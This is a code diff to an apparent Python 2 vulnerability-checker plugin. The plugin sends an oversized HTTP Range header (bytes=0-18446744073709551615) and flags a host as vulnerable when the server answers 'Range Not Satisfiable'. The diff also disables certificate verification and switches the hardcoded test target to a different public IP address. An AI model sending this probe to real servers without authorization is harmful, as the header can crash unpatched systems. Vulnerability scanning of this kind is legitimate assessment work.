@@ -12,7 +12,7 @@ class P(T):
         T.__init__(self)
     def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
         timeout=3
-        if port == 443:
+        if int(port) == 443:
             protocal = "https"
         else:
             protocal = "http"
@@ -23,14 +23,14 @@ class P(T):
         result['result']=False
         r=None
 
-        vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
+        vuln_header = {"Range": "bytes=0-18446744073709551615"}
 
         try:
 
 
-            r=requests.get(url=target_url,params=vuln_buffer,timeout=timeout)
-            print r.content
-            if "请求范围不符合" in r.content:
+            r=requests.get(url=target_url,headers=vuln_header,timeout=timeout,verify=False,allow_redirects=False)
+            #print r.content
+            if "请求范围不符合" in r.content or "Requested Range Not Satisfiable" in r.content:
 
 
                 result['result']=True
@@ -50,4 +50,4 @@ class P(T):
 
 
 if __name__ == '__main__':
-    print P().verify(ip='125.71.1.238',port='80')
+    print P().verify(ip='202.85.212.101',port='443')
